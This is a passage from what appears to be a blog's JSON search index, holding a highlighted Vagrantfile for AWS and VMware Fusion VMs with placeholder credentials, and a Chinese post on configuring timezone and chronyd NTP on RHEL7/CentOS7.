style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      vb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecpus \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# aws\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:aws\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003eaws, override\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# aws configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eaccess_key_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_AWS_ACCESS_KEY_ID\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esecret_access_key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_AWS_ACCESS_KEY\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ekeypair_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esecurity_groups \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einstance_type \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;t2.small\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eregion \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;us-east-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# ubuntu 14.04 x64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eami \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-864d84ee\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# override info\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003essh\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eusername \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ubuntu\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003essh\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprivate_key_path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_AWS_PRIVATE_KEY_PATH\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esynced_folder \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_SYNC_FOLDER\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/vagrant\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003etype\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rsync\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dimroc/awsdummy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# VMs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  (\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e..\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eMAX_VM_NUMBER\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eeach \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003ei\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# define linux\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edefine \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;l\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003enode\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# aws\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      node\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:aws\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003eaws\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-linux-\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# node.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.%d\u0026#34; % (i+2)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      node\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehostname \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ftan-linux-\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# define windows\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edefine \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;w\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003enode\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      node\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:aws\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003eaws\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eami \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ami-2ae02342\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-windows-\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# define customer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eYOUR_CUSTOMIZED_VM\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eeach \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edefine \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e vm\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003enode\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# aws\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      node\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:aws\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003eaws\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eami \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eAWS_AMIS\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;platform\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        aws\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-%s\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e vm\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# vmware fusion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# vmware workstation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      node\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:vmware_fusion\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003efusion\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        fusion\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eLOCAL_BOXS\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;platform\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        fusion\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehostname \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eYOUR_NAME\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-%s\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e vm\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# vsphere\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#75715e\"\u003e# azure\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","vagrant"],"title":"Vagrantfile and Provider"},{"categories":["URL","Linux","chrony"],"contents":" 如何設定時區與 NTP 服務在 RHEL7/CentOS7 chrony 包含兩個程序，chronyd 是一個可以在啟動時啟動的守護進程，chronyc 是一個命令行界面程序，可用於監控 chronyd 的性能並在運行時更改各種運行參數。\n注意 ntpd 和 chronyd 擇一就可，不要同時運作。\n設定時區 ~# timedatectl set-timezone Asia/Taipei ~# timedatectl Local time: Tue 2018-03-27 14:13:38 CST Universal time: Tue 2018-03-27 06:13:38 UTC RTC time: Tue 2018-03-27 06:13:40 Time zone: Asia/Taipei (CST, +0800) NTP enabled: no NTP synchronized: no RTC in local TZ: no DST active: n/a 設定 chronyd # 安裝 ~# yum install -y chrony # 配置設定檔 ~# cat /etc/chrony.conf # Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.tw.pool.ntp.org iburst ---\u0026gt;改成本地的伺服器 server 1.tw.pool.ntp.org iburst ---\u0026gt;改成本地的伺服器 server 2.tw.pool.ntp.org iburst ---\u0026gt;改成本地的伺服器 server 3.tw.pool.ntp.org iburst ---\u0026gt;改成本地的伺服器 # 啟動服務和設為開機時啟動 ~# systemctl enable chronyd ~# systemctl start chronyd racking 參數顯示有關系統時間效能 ~# chronyc tracking Reference ID : 3DD8996B (61-216-153-107.hinet-ip.hinet.net) ---\u0026gt;表示現在同步的時間伺服器，如果沒有id表示沒有同步 Stratum : 4 ---\u0026gt;表示計算機有多少\u0026#34;跳hop\u0026#34; 表示本地的是第四層 Ref time (UTC) : Tue Mar 27 06:03:38 2018 ---\u0026gt;最後一次測量的時間 System time : 0.000040356 seconds fast of NTP time ---\u0026gt;調整系統時間 Last offset : +0.000163738 seconds RMS offset : 0.000163738 seconds Frequency : 21.384 ppm fast Residual freq : +0.000 ppm Skew : 675.319 ppm Root delay : 0.008527911 seconds Root dispersion : 0.066466033 seconds Update interval : 2.0 seconds Leap status : Normal ---\u0026gt;Normal要顯示此值, Insert second, Delete second or Not synchronised. ~# chronyc sources -v 210 Number of sources = 4 .-- Source mode \u0026#39;^\u0026#39; = server, \u0026#39;=\u0026#39; = peer, \u0026#39;#\u0026#39; = local clock. / .- Source state \u0026#39;*\u0026#39; = current synced, \u0026#39;+\u0026#39; = combined , \u0026#39;-\u0026#39; = not combined, | / \u0026#39;?\u0026#39; = unreachable, \u0026#39;x\u0026#39; = time may be in error, \u0026#39;~\u0026#39; = time too variable. || .- xxxx [ yyyy ] +/- zzzz || Reachability register (octal) -. | xxxx = adjusted offset, || Log2(Polling interval) --. | | yyyy = measured offset, || \\ | | zzzz = estimated error. || | | \\ MS Name/IP address Stratum Poll Reach LastRx Last sample =============================================================================== ^* 59-124-29-241.hinet-ip.h\u0026gt; 3 6 37 24 -1462us[-2363us] +/- 49ms ^+ 61-216-153-107.hinet-ip.\u0026gt; 3 6 37 23 -556us[ -556us] +/- 64ms ^? 59-125-122-217.hinet-ip.\u0026gt; 0 7 0 - +0ns[ +0ns] +/- 0ns ^- 61-216-153-105.hinet-ip.\u0026gt; 3 6 37 23 -280us[ -280us] +/- 64ms 看同步源頭的資訊 ~# chronyc sourcestats -v 210 Number of sources = 4 .- Number of sample points in measurement set. / .- Number of residual runs with same sign. | / .- Length of measurement set (time). | | / .- Est. clock freq error (ppm). | | | / .- Est. error in freq. | | | | / .- Est. offset. | | | | | | On the -. | | | | | | samples. \\ | | | | | | | Name/IP Address NP NR Span Frequency Freq Skew Offset Std Dev ============================================================================== 59-124-29-241.hinet-ip.h\u0026gt; 6 5 135 -0.454 4.553 -784us 66us 61-216-153-107.hinet-ip.\u0026gt; 6 6 135 +4.455 19.761 +622us 247us 59-125-122-217.hinet-ip.\u0026gt; 0 0 0 +0.000 2000.000 +0ns 4000ms 61-216-153-105.hinet-ip.\u0026gt; 6 4 136 +8.965 42.440 +1250us 495us 將系統時間寫到硬體(主機板上的時間)上 ~# hwclock --systohc ~# date ; hwclock Tue Mar 27 14:07:57 CST 2018 Tue 27 Mar 2018 02:07:58 PM CST -0.938012 seconds ","date":"September 29, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200929-how-to-config-chronyd-on-rhel7-centos7/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.skywebster.com/how-to-config-chronyd-on-rhel7-centos7/\" target=\"_blank\" rel=\"noopener\"\u003e如何設定時區與 NTP 服務在 